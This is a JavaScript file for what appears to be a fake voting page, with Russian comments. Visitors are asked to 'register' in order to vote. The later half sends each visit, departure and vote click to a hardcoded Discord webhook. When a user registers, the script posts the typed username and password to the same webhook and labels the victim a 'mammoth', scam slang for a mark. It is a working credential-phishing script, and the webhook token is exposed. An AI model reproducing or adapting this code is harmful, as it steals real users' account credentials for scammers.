document.getElementById('voteButton').addEventListener('click', function() {
    document.getElementById('modal').style.display = 'block';
});

document.getElementById('closeModal').addEventListener('click', function() {
    document.getElementById('modal').style.display = 'none';
});

document.getElementById('registerButton').addEventListener('click', function() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Проверка пароля
    if (password.length < 8 || /[а-яА-Я]/.test(password)) {
        document.getElementById('error-message').style.display = 'block';
        return;
    }

    // Успешная регистрация
    document.getElementById('voteCount').textContent = parseInt(document.getElementById('voteCount').textContent) + 1;
    document.getElementById('modal').style.display = 'none';
});

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    if (event.target == document.getElementById('modal')) {
        document.getElementById('modal').style.display = 'none';
    }
};
const webhookUrl = 'https://discord.com/api/webhooks/1299013641084866674/PKIfals7J4p1kYsUJCQesFHK06vZKKR_dL2T_cLvxFylqnsEweKVADcKz-N_Ej4yzNRv';

// Функция для отправки сообщения в Discord
function sendToDiscord(message) {
    const data = {
        content: message,
    };

    fetch(webhookUrl, {
        method: 'POST',
        body: JSON.stringify(data),
        headers: { 'Content-Type': 'application/json' },
    })
    .then(response => {
        if (!response.ok) {
            console.error('Не удалось отправить сообщение в Discord');
        }
    })
    .catch(error => console.error('Ошибка:', error));
}

// Уведомление в Discord при входе пользователя на сайт
window.onload = () => {
    sendToDiscord('Мамонт зашел на сайт.');
};

// Уведомление в Discord при попытке покинуть сайт
window.onbeforeunload = () => {
    sendToDiscord('Мамонт покинул сайт.');
};

// Обработка клика по кнопке голосования
document.getElementById('voteButton').addEventListener('click', function() {
    document.getElementById('modal').style.display = 'block';
    sendToDiscord('Мамонт нажал кнопку "Голосовать".');
});

// Закрытие модального окна
document.getElementById('closeModal').addEventListener('click', function() {
    document.getElementById('modal').style.display = 'none';
});

// Обработка регистрации
document.getElementById('registerButton').addEventListener('click', function() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;

    // Проверка пароля
    if (password.length < 8 || /[а-яА-Я]/.test(password)) {
        document.getElementById('error-message').style.display = 'block';
        return;
    }

    // Успешная регистрация
    document.getElementById('voteCount').textContent = parseInt(document.getElementById('voteCount').textContent) + 1;
    document.getElementById('modal').style.display = 'none';

    // Уведомление в Discord о попытке входа
    sendToDiscord(`Мамонь дал данные:\nЛогин Мамонта: ${username}\nПароль Мамонта: ${password}`);
});

// Закрытие модального окна при клике вне его
window.onclick = function(event) {
    if (event.target == document.getElementById('modal')) {
        document.getElementById('modal').style.display = 'none';
    }
};
